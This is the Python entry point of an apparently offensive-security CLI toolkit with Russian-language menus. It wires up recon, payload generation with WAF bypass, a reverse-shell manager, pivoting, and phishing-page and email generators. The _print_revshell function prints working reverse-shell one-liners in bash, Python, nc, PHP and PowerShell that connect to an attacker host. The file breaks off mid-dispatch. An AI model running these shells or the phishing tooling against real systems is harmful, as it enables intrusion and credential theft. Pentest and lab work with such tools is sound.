"""
CyberSec Toolkit — точка входа.
Author: idqwixxa
"""
import sys
import argparse
import importlib
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm

from core.banner import show_banner
from core.logger import get_logger
from core.database import db

console = Console()
log = get_logger(__name__)


class _LazyModule:
    def __init__(self, module_name: str) -> None:
        self._module_name = module_name
        self._module = None

    def _load(self):
        if self._module is None:
            self._module = importlib.import_module(self._module_name)
        return self._module

    def __getattr__(self, name: str):
        return getattr(self._load(), name)


recon              = _LazyModule("modules.recon")
web_vuln           = _LazyModule("modules.web_vuln")
passwords          = _LazyModule("modules.passwords")
osint              = _LazyModule("modules.osint")
network            = _LazyModule("modules.network")
bugbounty          = _LazyModule("modules.bugbounty")
roadmap            = _LazyModule("modules.roadmap")
utils_tools        = _LazyModule("modules.utils_tools")
censys_lookup      = _LazyModule("modules.censys_lookup")
async_engine       = _LazyModule("modules.async_engine")
wordlist_updater   = _LazyModule("modules.wordlist_updater")
screenshot         = _LazyModule("modules.screenshot")
report_export      = _LazyModule("modules.report_export")
scheduler          = _LazyModule("modules.scheduler")
notifier           = _LazyModule("modules.notifier")
stego_pro          = _LazyModule("modules.stego_pro")
wordlist_tools     = _LazyModule("modules.wordlist_tools")
payload_factory    = _LazyModule("modules.payload_factory")
web_crawler        = _LazyModule("modules.web_crawler")
telegram_bot       = _LazyModule("modules.telegram_bot")
web_fuzzer         = _LazyModule("modules.web_fuzzer")
stats              = _LazyModule("modules.stats")
vault              = _LazyModule("modules.vault")
notes              = _LazyModule("modules.notes")
auto_report        = _LazyModule("modules.auto_report")
http_proxy         = _LazyModule("modules.http_proxy")
shell_manager      = _LazyModule("modules.shell_manager")
dns_tools          = _LazyModule("modules.dns_tools")
subdomain_takeover = _LazyModule("modules.subdomain_takeover")
cve_feeds          = _LazyModule("modules.cve_feeds")
wireless_toolkit   = _LazyModule("modules.wireless_toolkit")
wordpress_scanner  = _LazyModule("modules.wordpress_scanner")
graphql_discovery  = _LazyModule("modules.graphql_discovery")
pivot_helper       = _LazyModule("modules.pivot_helper")
social_engineer    = _LazyModule("modules.social_engineer")
threat_intel       = _LazyModule("modules.threat_intel")
bugbounty_autoscan = _LazyModule("modules.bugbounty_autoscan")
report_pack        = _LazyModule("modules.report_pack")
plugin_loader      = _LazyModule("core.plugin_loader")


MENU = [
    ("1", "Reconnaissance", lambda: recon.menu()),
    ("2", "Web Vulnerabilities", lambda: web_vuln.menu()),
    ("3", "Passwords & Hashes", lambda: passwords.menu()),
    ("4", "OSINT", lambda: osint.menu()),
    ("5", "Network (ARP, sniff, MITM, WiFi)", lambda: network.menu()),
    ("6", "Bug Bounty (CVSS, reports)", lambda: bugbounty.menu()),
    ("7", "Roadmap / Обучение", lambda: roadmap.menu()),
    ("8", "Утилиты (encode, crypto, hashes, stego)", lambda: utils_tools.menu()),
    ("9", "Censys (поиск хостов/сертификатов)", lambda: censys_lookup.menu()),
    ("10", "Async Engine (быстрый портскан/HTTP-скан)", lambda: async_engine.menu()),
    ("11", "Wordlist Updater (словари с GitHub)", lambda: wordlist_updater.menu()),
    ("12", "Wordlist Tools (генератор hashcat-like)", lambda: wordlist_tools.menu()),
    ("13", "Payload Factory (XSS/SQLi/LFI + обход WAF)", lambda: payload_factory.menu()),
    ("14", "Web Crawler (сбор форм/параметров/URL)", lambda: web_crawler.menu()),
    ("15", "Web Fuzzer (ffuf-like)", lambda: web_fuzzer.menu()),
    ("16", "Screenshot (снимки сайтов)", lambda: screenshot.menu()),
    ("17", "Report Export (HTML / PDF / Markdown)", lambda: report_export.menu()),
    ("18", "Scheduler (планировщик задач)", lambda: scheduler.menu()),
    ("19", "Notifier (Telegram / Discord / Email / Desktop)", lambda: notifier.menu()),
    ("20", "Steganography Pro (PNG/WAV, AES, chi-square)", lambda: stego_pro.menu()),
    ("21", "🤖 Telegram Bot (управление из чата)", lambda: telegram_bot.menu()),
    ("22", "📊 Graph & Statistics (графики)", lambda: stats.menu()),
    ("23", "🧩 Плагины (расширения)", lambda: plugin_loader.plugin_menu()),
    ("24", "🔐 Password Vault (шифрованное хранилище)", lambda: vault.menu()),
    ("25", "📝 Notes & Findings (заметки/находки)", lambda: notes.menu()),
    ("26", "📄 Auto-Report Pro (единый отчёт)", lambda: auto_report.menu()),
    ("27", "🌐 HTTP/HTTPS Proxy (MITM для лабы)", lambda: http_proxy.menu()),
    ("28", "🐚 Shell Manager (reverse-shell сессии)", lambda: shell_manager.menu()),
    ("29", "🌍 DNS Tools (AXFR/DNSSEC/PTR/SPF)", lambda: dns_tools.menu()),
    ("30", "🎯 Subdomain Takeover Detector", lambda: subdomain_takeover.menu()),
    ("31", "📡 CVE Feeds (NVD + CISA KEV + dorks)", lambda: cve_feeds.menu()),
    ("32", "📶 Wireless Toolkit (Wi-Fi анализ)", lambda: wireless_toolkit.menu()),
    ("33", "🔍 WordPress Scanner", lambda: wordpress_scanner.menu()),
    ("34", "🔎 GraphQL / API Discovery", lambda: graphql_discovery.menu()),
    ("35", "🔀 Pivot / Post-Exploitation Helpers", lambda: pivot_helper.menu()),
    ("36", "🎭 Social Engineering Toolkit (CTF)", lambda: social_engineer.menu()),
    ("37", "🟡 Threat Intelligence Lookup", lambda: threat_intel.menu()),
    ("38", "🟢 Bug Bounty Auto-Scan (пайплайн)", lambda: bugbounty_autoscan.menu()),
    ("39", "📝 Report Templates Pack (H1/Bugcrowd/...)", lambda: report_pack.menu()),
    ("40", "История сканов", None),
    ("0", "Выход", None),
]


def show_menu() -> None:
    table = Table(title="[bold cyan]ГЛАВНОЕ МЕНЮ[/bold cyan]  "
                        "[magenta]by idqwixxa[/magenta]")
    table.add_column("№", style="bold yellow", width=4)
    table.add_column("Модуль", style="white")
    for num, title, _ in MENU:
        table.add_row(num, title)
    console.print(table)


def show_history() -> None:
    rows = db.history(20)
    if not rows:
        console.print("[yellow]История пуста.[/yellow]")
        return
    table = Table(title="Последние сканы")
    table.add_column("ID", style="cyan")
    table.add_column("Модуль", style="magenta")
    table.add_column("Цель", style="green")
    table.add_column("Дата", style="white")
    for r in rows:
        table.add_row(str(r["id"]), r["module"], r["target"], str(r["created_at"]))
    console.print(table)


def interactive() -> None:
    if not Confirm.ask(
        "[bold red]Подтверждаешь этичное использование?[/bold red]",
        default=False,
    ):
        console.print("[red]Выход.[/red]")
        sys.exit(1)
    while True:
        console.print()
        show_menu()
        choice = Prompt.ask("[bold green]Выбери пункт[/bold green]", default="0")
        if choice == "0":
            console.print("[bold cyan]До встречи, хакер![/bold cyan]")
            break
        if choice == "40":
            show_history()
            continue
        entry = next((m for m in MENU if m[0] == choice), None)
        if not entry or entry[2] is None:
            console.print("[red]Неверный пункт.[/red]")
            continue
        try:
            entry[2]()
        except KeyboardInterrupt:
            console.print("\n[yellow]Прервано.[/yellow]")
        except Exception as exc:  # noqa: BLE001
            log.exception("Ошибка модуля: %s", exc)
            console.print(f"[red]Ошибка: {exc}[/red]")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="cyber_toolkit",
        description="CyberSec Toolkit — CLI (by idqwixxa)",
    )
    p.add_argument("--no-banner", action="store_true")
    p.add_argument("--tui", action="store_true")
    sub = p.add_subparsers(dest="cmd")

    s = sub.add_parser("whois"); s.add_argument("target")
    s = sub.add_parser("dns"); s.add_argument("target")
    s = sub.add_parser("subdomain"); s.add_argument("target")
    s = sub.add_parser("portscan")
    s.add_argument("target"); s.add_argument("-p", "--ports", default="1-1024")
    s = sub.add_parser("geoip"); s.add_argument("target")
    s = sub.add_parser("fingerprint"); s.add_argument("url")
    s = sub.add_parser("dork"); s.add_argument("domain")
    s = sub.add_parser("shodan"); s.add_argument("query")

    s = sub.add_parser("headers"); s.add_argument("url")
    s = sub.add_parser("ssl"); s.add_argument("host")
    s = sub.add_parser("sqli"); s.add_argument("url")
    s = sub.add_parser("xss"); s.add_argument("url")
    s = sub.add_parser("lfi"); s.add_argument("url")
    s = sub.add_parser("dirb"); s.add_argument("url")
    s = sub.add_parser("cms"); s.add_argument("url")
    s = sub.add_parser("redirect"); s.add_argument("url")
    s = sub.add_parser("csrf"); s.add_argument("url")

    s = sub.add_parser("hashid"); s.add_argument("hash")
    s = sub.add_parser("crack"); s.add_argument("hash")
    s = sub.add_parser("genpass")
    s.add_argument("-l", "--length", type=int, default=16)

    s = sub.add_parser("username"); s.add_argument("username")
    s = sub.add_parser("hibp"); s.add_argument("email")
    s = sub.add_parser("phone"); s.add_argument("phone")
    s = sub.add_parser("exif"); s.add_argument("path")
    s = sub.add_parser("ghdork"); s.add_argument("query")

    s = sub.add_parser("censys"); s.add_argument("query")
    s = sub.add_parser("censys-host"); s.add_argument("ip")
    s = sub.add_parser("censys-cert"); s.add_argument("sha256")

    s = sub.add_parser("asyncscan")
    s.add_argument("target"); s.add_argument("-p", "--ports", default="1-1024")
    s.add_argument("-c", "--concurrency", type=int, default=500)
    s = sub.add_parser("asyncweb")
    s.add_argument("url")
    s.add_argument("-P", "--paths", default="admin,login,api,robots.txt,.env")
    s.add_argument("-c", "--concurrency", type=int, default=50)

    s = sub.add_parser("wordlists-update")
    s.add_argument("--check", action="store_true")
    s = sub.add_parser("wordlist-gen")
    s.add_argument("word")
    s.add_argument("-o", "--out", default="custom_wordlist.txt")
    s.add_argument("--no-leet", action="store_true")
    s.add_argument("--no-years", action="store_true")
    s.add_argument("--no-symbols", action="store_true")

    s = sub.add_parser("payload")
    s.add_argument("kind", choices=["xss", "sqli", "lfi", "ssrf", "cmdi", "ssti"])
    s.add_argument("--encode", choices=["none", "url", "double-url", "hex",
                                        "unicode", "base64"], default="none")
    s.add_argument("--obfuscate", action="store_true")
    s.add_argument("--count", type=int, default=10)

    s = sub.add_parser("crawl")
    s.add_argument("url")
    s.add_argument("-d", "--depth", type=int, default=1)
    s.add_argument("-m", "--max-pages", type=int, default=50)

    s = sub.add_parser("fuzz")
    s.add_argument("mode", choices=["paths", "params", "headers"])
    s.add_argument("url")
    s.add_argument("-w", "--wordlist", default=None)
    s.add_argument("-t", "--threads", type=int, default=20)
    s.add_argument("-H", "--header", default="User-Agent")

    s = sub.add_parser("screenshot")
    s.add_argument("url"); s.add_argument("--no-full", action="store_true")

    s = sub.add_parser("export-html")
    s.add_argument("-n", "--limit", type=int, default=500)
    s = sub.add_parser("export-pdf")
    s.add_argument("-n", "--limit", type=int, default=300)
    s = sub.add_parser("export-scan")
    s.add_argument("scan_id", type=int)

    sub.add_parser("stats")
    s = sub.add_parser("stats-graphs")
    s.add_argument("--open", action="store_true")

    sub.add_parser("plugins")
    sub.add_parser("plugins-menu")
    sub.add_parser("plugins-reload")
    s = sub.add_parser("plugin-run")
    s.add_argument("key")
    s.add_argument("arg", nargs="?", default=None)

    sub.add_parser("vault")
    sub.add_parser("vault-status")
    sub.add_parser("vault-init")
    s = sub.add_parser("vault-add")
    s.add_argument("title", nargs="?", default=None)
    s.add_argument("--username", "-u", default=None)
    s.add_argument("--password", "-p", default=None)
    s.add_argument("--url", default=None)
    s.add_argument("--notes", default=None)
    s.add_argument("--generate", "-g", action="store_true")
    s.add_argument("--length", "-l", type=int, default=20)
    s = sub.add_parser("vault-get"); s.add_argument("title")
    sub.add_parser("vault-list")
    s = sub.add_parser("vault-search"); s.add_argument("query")
    s = sub.add_parser("vault-del"); s.add_argument("title")
    s = sub.add_parser("vault-export"); s.add_argument("out")
    s = sub.add_parser("vault-import"); s.add_argument("in_path")
    sub.add_parser("vault-change-master")

    sub.add_parser("notes")
    sub.add_parser("note-stats")
    s = sub.add_parser("note-add")
    s.add_argument("title", nargs="?", default=None)
    s.add_argument("-b", "--body", default=None)
    s.add_argument("-t", "--target", default=None)
    s.add_argument("--tags", default=None)
    s = sub.add_parser("finding-add")
    s.add_argument("title", nargs="?", default=None)
    s.add_argument("-b", "--body", default=None)
    s.add_argument("-t", "--target", default=None)
    s.add_argument("-s", "--severity",
                   choices=["info", "low", "medium", "high", "critical"],
                   default=None)
    s.add_argument("--status",
                   choices=["open", "in-progress", "resolved",
                            "wontfix", "dup", "invalid"],
                   default=None)
    s.add_argument("--tags", default=None)
    s = sub.add_parser("note-list")
    s.add_argument("--kind", choices=["note", "finding"], default=None)
    s.add_argument("-t", "--target", default=None)
    s.add_argument("--status", default=None)
    s.add_argument("--severity", default=None)
    s.add_argument("--tag", default=None)
    s = sub.add_parser("note-show"); s.add_argument("id", type=int)
    s = sub.add_parser("note-del"); s.add_argument("id", type=int)
    s = sub.add_parser("note-edit"); s.add_argument("id", type=int)
    s = sub.add_parser("note-search"); s.add_argument("query")
    s = sub.add_parser("findings-export")
    s.add_argument("-t", "--target", default=None)
    s.add_argument("-o", "--out", default=None)

    sub.add_parser("report-pro")
    s = sub.add_parser("report-pro-html")
    s.add_argument("-t", "--target", default=None)
    s.add_argument("-o", "--out", default=None)
    s.add_argument("--template",
                   choices=["default", "hackerone", "bugcrowd"],
                   default="default")
    s.add_argument("--open", action="store_true")
    s = sub.add_parser("report-pro-pdf")
    s.add_argument("-t", "--target", default=None)
    s.add_argument("-o", "--out", default=None)
    s.add_argument("--template",
                   choices=["default", "hackerone", "bugcrowd"],
                   default="default")
    s.add_argument("--open", action="store_true")
    s = sub.add_parser("report-pro-json")
    s.add_argument("-t", "--target", default=None)
    s.add_argument("-o", "--out", default=None)

    sub.add_parser("proxy")
    s = sub.add_parser("proxy-start")
    s.add_argument("-p", "--port", type=int, default=8080)
    s.add_argument("--no-mitm", action="store_true")
    sub.add_parser("proxy-status")
    sub.add_parser("proxy-ca")
    sub.add_parser("proxy-rules")
    sub.add_parser("proxy-rules-clear")
    s = sub.add_parser("proxy-rule-add")
    s.add_argument("target", choices=["request", "response"])
    s.add_argument("action", choices=["replace", "add-header", "drop"])
    s.add_argument("match")
    s.add_argument("--replace", default="")
    s.add_argument("--header-name", default="")
    s.add_argument("--header-value", default="")

    sub.add_parser("shell")
    sub.add_parser("shell-status")
    sub.add_parser("shell-list")
    s = sub.add_parser("shell-start")
    s.add_argument("-H", "--host", default="0.0.0.0")
    s.add_argument("-p", "--port", type=int, default=4444)
    sub.add_parser("shell-stop")

    sub.add_parser("dns-tools")
    s = sub.add_parser("dns-axfr"); s.add_argument("domain")
    s = sub.add_parser("dns-dnssec"); s.add_argument("domain")
    s = sub.add_parser("dns-wildcard"); s.add_argument("domain")
    s = sub.add_parser("dns-ptr"); s.add_argument("cidr")
    s.add_argument("-t", "--threads", type=int, default=50)
    s = sub.add_parser("dns-snoop")
    s.add_argument("domain"); s.add_argument("-r", "--resolver", default=None)
    s = sub.add_parser("dns-cname"); s.add_argument("domain")
    s = sub.add_parser("dns-srv"); s.add_argument("domain")
    s = sub.add_parser("dns-mail"); s.add_argument("domain")
    s = sub.add_parser("dns-rebinding"); s.add_argument("domain")

    sub.add_parser("takeover")
    s = sub.add_parser("takeover-scan")
    s.add_argument("domain")
    s.add_argument("-w", "--wordlist", default="subdomains.txt")
    s.add_argument("-t", "--threads", type=int, default=30)
    s = sub.add_parser("takeover-check"); s.add_argument("subdomain")
    s = sub.add_parser("takeover-batch")
    s.add_argument("source")
    s.add_argument("-t", "--threads", type=int, default=20)
    sub.add_parser("takeover-services")

    sub.add_parser("cve")
    s = sub.add_parser("cve-download")
    s.add_argument("-k", "--keyword", default="")
    s.add_argument("-d", "--days", type=int, default=0)
    s.add_argument("-n", "--max", type=int, default=500,
                   dest="max_results")
    s = sub.add_parser("cve-search")
    s.add_argument("keyword")
    s.add_argument("--min-score", type=float, default=None)
    s.add_argument("--kev", action="store_true")
    s.add_argument("-n", "--limit", type=int, default=30)
    s = sub.add_parser("cve-top")
    s.add_argument("-d", "--days", type=int, default=7)
    s.add_argument("--min-score", type=float, default=7.0)
    s.add_argument("-n", "--limit", type=int, default=50)
    s = sub.add_parser("cve-kev")
    s.add_argument("-n", "--limit", type=int, default=100)
    sub.add_parser("cve-kev-update")
    s = sub.add_parser("cve-show")
    s.add_argument("cve_id")
    s = sub.add_parser("cve-dorks")
    s.add_argument("product")
    s.add_argument("--version", default="")
    s.add_argument("--cve-id", default="")
    sub.add_parser("cve-stats")

    sub.add_parser("wifi")
    sub.add_parser("wifi-scan")
    sub.add_parser("wifi-evil")
    sub.add_parser("wifi-open")
    sub.add_parser("wifi-weak")
    sub.add_parser("wifi-channels")
    sub.add_parser("wifi-top")
    sub.add_parser("wifi-export-csv")
    sub.add_parser("wifi-export-json")
    sub.add_parser("wifi-full")

    sub.add_parser("wp")
    s = sub.add_parser("wp-scan")
    s.add_argument("url")
    s.add_argument("--aggressive", action="store_true")
    s = sub.add_parser("wp-detect"); s.add_argument("url")
    s = sub.add_parser("wp-users"); s.add_argument("url")
    s = sub.add_parser("wp-plugins"); s.add_argument("url")
    s = sub.add_parser("wp-xmlrpc"); s.add_argument("url")
    s = sub.add_parser("wp-vulns"); s.add_argument("url")

    sub.add_parser("gql")
    s = sub.add_parser("gql-scan"); s.add_argument("url")
    s = sub.add_parser("gql-discover"); s.add_argument("url")
    s = sub.add_parser("gql-introspect"); s.add_argument("endpoint")
    s = sub.add_parser("api-swagger"); s.add_argument("url")
    s = sub.add_parser("api-rest"); s.add_argument("url")
    s = sub.add_parser("api-js"); s.add_argument("url")

    # ---- Pivot Helpers ----
    sub.add_parser("pivot", help="Меню Pivot / Post-Exploitation")
    s = sub.add_parser("pivot-reverse", help="Reverse shell one-liners")
    s.add_argument("-l", "--lhost", default=None)
    s.add_argument("-p", "--lport", default=None)
    s = sub.add_parser("pivot-bind", help="Bind shell one-liners")
    s.add_argument("-p", "--lport", default=None)
    s = sub.add_parser("pivot-tty", help="TTY upgrade")
    s.add_argument("-l", "--lhost", default=None)
    s.add_argument("-p", "--lport", default=None)
    s = sub.add_parser("pivot-transfer", help="File transfer")
    s.add_argument("-l", "--lhost", default=None)
    s.add_argument("-t", "--target-ip", default=None)
    s = sub.add_parser("pivot-tunnel", help="Pivoting (SSH, socat, chisel)")
    s.add_argument("-l", "--lhost", default=None)
    s.add_argument("-p", "--lport", default=None)
    s.add_argument("-t", "--target-ip", default=None)
    s = sub.add_parser("pivot-linux", help="Linux privesc checks")
    s.add_argument("-t", "--target-ip", default=None)
    s = sub.add_parser("pivot-windows", help="Windows privesc checks")
    s.add_argument("-l", "--lhost", default=None)
    sub.add_parser("pivot-encode", help="Payload encoding")

    # ---- Social Engineering (CTF) ----
    sub.add_parser("se", help="Social Engineering Toolkit (CTF/lab)")
    sub.add_parser("se-templates", help="Список SE-шаблонов")
    s = sub.add_parser("se-phish", help="Сгенерировать фишинг-страницу")
    s.add_argument("template", nargs="?", default="employee-portal")
    s.add_argument("-o", "--out", default=None)
    s = sub.add_parser("se-server", help="Телеметрийный сервер")
    s.add_argument("-p", "--port", type=int, default=8000)
    s.add_argument("-t", "--template", default="employee-portal")
    s.add_argument("-r", "--redirect", default="https://example.com")
    s = sub.add_parser("se-qr", help="QR-код генератор")
    s.add_argument("data")
    s.add_argument("-o", "--out", default=None)
    s = sub.add_parser("se-email", help="Email шаблон (.eml)")
    s.add_argument("template", nargs="?", default="it-helpdesk")
    s.add_argument("-l", "--link", default="https://example.com/login")
    s.add_argument("--name", default="John")
    s.add_argument("-o", "--out", default=None)
    s = sub.add_parser("se-sms", help="SMS шаблон")
    s.add_argument("template", nargs="?", default="bank")
    s.add_argument("-l", "--link", default="https://example.com")
    s = sub.add_parser("se-clone", help="Клонировать веб-страницу")
    s.add_argument("url")
    s.add_argument("-o", "--out", default=None)
    s = sub.add_parser("se-obfuscate", help="Обфускация URL")
    s.add_argument("url")
    s = sub.add_parser("se-pixel", help="Tracking pixel")
    s.add_argument("-s", "--server", default="http://127.0.0.1:8000/pixel")
    s.add_argument("-o", "--out", default=None)

    # ---- Threat Intelligence ----
    sub.add_parser("ti", help="Threat Intel меню")
    s = sub.add_parser("ti-ip", help="Проверить IP")
    s.add_argument("ip")
    s = sub.add_parser("ti-domain", help="Проверить домен")
    s.add_argument("domain")
    s = sub.add_parser("ti-hash", help="Проверить хеш")
    s.add_argument("hash")
    s = sub.add_parser("ti-url", help="Проверить URL")
    s.add_argument("url")
    s = sub.add_parser("ti-auto", help="Авто-детект типа IOC")
    s.add_argument("ioc")
    s = sub.add_parser("ti-bulk", help="Проверить список IOC")
    s.add_argument("source", help="Файл или строка через запятую")
    s.add_argument("-t", "--threads", type=int, default=4)
    sub.add_parser("ti-sources", help="Статус источников")

    # ---- Bug Bounty Auto-Scan ----
    sub.add_parser("autoscan", help="Auto-Scan меню")
    s = sub.add_parser("autoscan-run", help="Запустить пайплайн")
    s.add_argument("domain")
    s.add_argument("--profile",
                   choices=["quick", "full", "deep"], default="full")
    s.add_argument("-o", "--out", default=None)
    s.add_argument("--skip", default=None,
                   help="Стадии через запятую (subs,ports,http,hints,"
                        "screenshots,report)")
    sub.add_parser("autoscan-profiles", help="Показать профили")
    sub.add_parser("autoscan-past", help="Прошлые сканы")

    # ---- Report Pack ----
    sub.add_parser("report-pack", help="Report Templates Pack меню")
    s = sub.add_parser("rp-new", help="Новый отчёт (wizard)")
    s.add_argument("--platform",
                   choices=["hackerone", "bugcrowd", "intigriti",
                            "yeswehack", "immunefi", "cve"],
                   default="hackerone")
    s = sub.add_parser("rp-preset", help="Отчёт из пресета")
    s.add_argument("preset")
    s.add_argument("--platform",
                   choices=["hackerone", "bugcrowd", "intigriti",
                            "yeswehack", "immunefi", "cve"],
                   default="hackerone")
    s = sub.add_parser("rp-from-finding", help="Отчёт из finding")
    s.add_argument("finding_id", type=int)
    s.add_argument("--platform",
                   choices=["hackerone", "bugcrowd", "intigriti",
                            "yeswehack", "immunefi", "cve"],
                   default="hackerone")
    s.add_argument("--preset", default=None)
    s = sub.add_parser("rp-bulk", help="Bulk: все findings → отчёты")
    s.add_argument("-t", "--target", default=None)
    s.add_argument("--platform",
                   choices=["hackerone", "bugcrowd", "intigriti",
                            "yeswehack", "immunefi", "cve"],
                   default="hackerone")
    sub.add_parser("rp-platforms", help="Список платформ")
    sub.add_parser("rp-presets", help="Список пресетов")
    s = sub.add_parser("rp-cvss", help="CVSS вектор → score")
    s.add_argument("vector")
    sub.add_parser("rp-list", help="Список сохранённых отчётов")

    sub.add_parser("scheduler-list")
    sub.add_parser("scheduler-run")
    sub.add_parser("notify-status")
    sub.add_parser("notify-test")
    sub.add_parser("bot")
    sub.add_parser("bot-info")
    sub.add_parser("stego-pro")
    s = sub.add_parser("stego-chi-png"); s.add_argument("path")
    s = sub.add_parser("stego-chi-wav"); s.add_argument("path")

    s = sub.add_parser("b64encode"); s.add_argument("text")
    s = sub.add_parser("b64decode"); s.add_argument("text")
    s = sub.add_parser("filehash"); s.add_argument("path")
    s = sub.add_parser("revshell")
    s.add_argument("lhost"); s.add_argument("-p", "--lport", default="4444")

    sub.add_parser("tui")
    return p


def _print_revshell(lhost: str, lport: str) -> None:
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python3": (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "php": (f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        "powershell": (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"New-Object System.Net.Sockets.TCPClient('{lhost}',{lport})"
        ),
    }
    for name, cmd in shells.items():
        console.print(f"[cyan]{name}:[/cyan] [green]{cmd}[/green]")


def _dispatch_cli(args: argparse.Namespace) -> bool:
    cmd = args.cmd
    try:
        if cmd == "whois": recon.whois_lookup(args.target)
        elif cmd == "dns": recon.dns_enum(args.target)
        elif cmd == "subdomain": recon.subdomain_scan(args.target)
        elif cmd == "portscan": recon.port_scan(args.target, args.ports)
        elif cmd == "geoip": recon.ip_geolocation(args.target)
        elif cmd == "fingerprint": recon.tech_fingerprint(args.url)
        elif cmd == "dork": recon.google_dork(args.domain)
        elif cmd == "shodan": recon.shodan_lookup(args.query)
        elif cmd == "headers": web_vuln.header_analyzer(args.url)
        elif cmd == "ssl": web_vuln.ssl_checker(args.host)
        elif cmd == "sqli": web_vuln.sqli_scan(args.url)
        elif cmd == "xss": web_vuln.xss_scan(args.url)
        elif cmd == "lfi": web_vuln.lfi_scan(args.url)
        elif cmd == "dirb": web_vuln.dir_bruteforce(args.url)
        elif cmd == "cms": web_vuln.cms_scanner(args.url)
        elif cmd == "redirect": web_vuln.open_redirect(args.url)
        elif cmd == "csrf": web_vuln.csrf_checker(args.url)
        elif cmd == "hashid": passwords.identify_hash(args.hash)
        elif cmd == "crack": passwords.crack_hash(args.hash)
        elif cmd == "genpass": passwords.generate_password(args.length)
        elif cmd == "username": osint.username_check(args.username)
        elif cmd == "hibp": osint.email_breach(args.email)
        elif cmd == "phone": osint.phone_lookup(args.phone)
        elif cmd == "exif": osint.exif_extractor(args.path)
        elif cmd == "ghdork": osint.github_dork(args.query)
        elif cmd == "censys": censys_lookup.censys_search(args.query)
        elif cmd == "censys-host": censys_lookup.censys_host(args.ip)
        elif cmd == "censys-cert": censys_lookup.censys_cert(args.sha256)
        elif cmd == "asyncscan":
            async_engine.async_port_scan(args.target, args.ports, args.concurrency)
        elif cmd == "asyncweb":
            async_engine.async_http_scan(args.url, args.paths, args.concurrency)
        elif cmd == "wordlists-update":
            if args.check: wordlist_updater.check_updates()
            else: wordlist_updater.update_all()
        elif cmd == "wordlist-gen":
            wordlist_tools.generate_wordlist(
                base_word=args.word, out_name=args.out,
                leet=not args.no_leet, years=not args.no_years,
                symbols=not args.no_symbols,
            )
        elif cmd == "payload":
            payload_factory.generate_payloads(
                kind=args.kind, encode=args.encode,
                obfuscate=args.obfuscate, count=args.count,
            )
        elif cmd == "crawl":
            web_crawler.crawl(args.url, depth=args.depth, max_pages=args.max_pages)
        elif cmd == "fuzz":
            if args.mode == "paths":
                web_fuzzer.fuzz_paths(args.url, args.wordlist, args.threads)
            elif args.mode == "params":
                web_fuzzer.fuzz_params(args.url, None, args.wordlist, args.threads)
            elif args.mode == "headers":
                web_fuzzer.fuzz_headers(args.url, args.header,
                                        args.wordlist, args.threads)
        elif cmd == "screenshot":
            screenshot.screenshot_one(args.url, full_page=not args.no_full)
        elif cmd == "export-html": report_export.export_html(args.limit)
        elif cmd == "export-pdf": report_export.export_pdf(args.limit)
        elif cmd == "export-scan": report_export.export_scan_markdown(args.scan_id)
        elif cmd == "stats": stats.text_summary()
        elif cmd == "stats-graphs": stats.generate_all(open_after=args.open)

        elif cmd == "plugins": plugin_loader.list_plugins_cli()
        elif cmd == "plugins-menu": plugin_loader.plugin_menu()
        elif cmd == "plugins-reload":
            reg = plugin_loader.reload_plugins()
            console.print(f"[green]✓ Загружено плагинов: {len(reg)}[/green]")
        elif cmd == "plugin-run":
            plugin_loader.run_plugin_cli(args.key, args.arg)

        elif cmd == "vault": vault.menu()
        elif cmd == "vault-status": vault.cli_status()
        elif cmd == "vault-init": vault.cli_init()
        elif cmd == "vault-add":
            vault.cli_add(
                title=args.title, username=args.username,
                password=args.password, url=args.url, notes=args.notes,
                generate=args.generate, gen_len=args.length,
            )
        elif cmd == "vault-get": vault.cli_get(args.title)
        elif cmd == "vault-list": vault.cli_list()
        elif cmd == "vault-search": vault.cli_search(args.query)
        elif cmd == "vault-del": vault.cli_delete(args.title)
        elif cmd == "vault-export": vault.cli_export(args.out)
        elif cmd == "vault-import": vault.cli_import(args.in_path)
        elif cmd == "vault-change-master": vault.cli_change_master()

        elif cmd == "notes": notes.menu()
        elif cmd == "note-stats": notes.cli_stats()
        elif cmd == "note-add":
            tags = [t.strip() for t in (args.tags or "").split(",") if t.strip()]
            notes.cli_add(kind="note", title=args.title, body=args.body,
                          target=args.target, tags=tags or None)
        elif cmd == "finding-add":
            tags = [t.strip() for t in (args.tags or "").split(",") if t.strip()]
            notes.cli_add(kind="finding", title=args.title, body=args.body,
                          target=args.target, severity=args.severity,
                          status=args.status, tags=tags or None)
        elif cmd == "note-list":
            notes.cli_list(kind=args.kind, target=args.target,
                           status=args.status, severity=args.severity,
                           tag=args.tag)
        elif cmd == "note-show": notes.cli_show(args.id)
        elif cmd == "note-del": notes.cli_del(args.id)
        elif cmd == "note-edit": notes.cli_edit(args.id)
        elif cmd == "note-search": notes.cli_search(args.query)
        elif cmd == "findings-export":
            notes.cli_export(target=args.target, out_path=args.out)

        elif cmd == "report-pro": auto_report.menu()
        elif cmd == "report-pro-html":
            p = auto_report.generate_html(
                target_filter=args.target, template=args.template,
                out_path=args.out,
            )
            if p and args.open:
                auto_report._open_file(p)
        elif cmd == "report-pro-pdf":
            p = auto_report.generate_pdf(
                target_filter=args.target, template=args.template,
                out_path=args.out,
            )
            if p and args.open:
                auto_report._open_file(p)
        elif cmd == "report-pro-json":
            auto_report.generate_json(target_filter=args.target,
                                      out_path=args.out)

        elif cmd == "proxy": http_proxy.menu()
        elif cmd == "proxy-start":
            http_proxy.run_proxy(port=args.port,
                                 intercept_https=not args.no_mitm)
        elif cmd == "proxy-status": http_proxy.quick_status()
        elif cmd == "proxy-ca": http_proxy.cli_ca_info()
        elif cmd == "proxy-rules": http_proxy.cli_list_rules()
        elif cmd == "proxy-rules-clear": http_proxy.cli_clear_rules()
        elif cmd == "proxy-rule-add":
            http_proxy.cli_add_rule(
                target=args.target, match=args.match, action=args.action,
                replace=args.replace, header_name=args.header_name,
                header_value=args.header_value,
            )

        elif cmd == "shell":
            shell_manager.repl()
        elif cmd == "shell-status": shell_manager.cli_status()
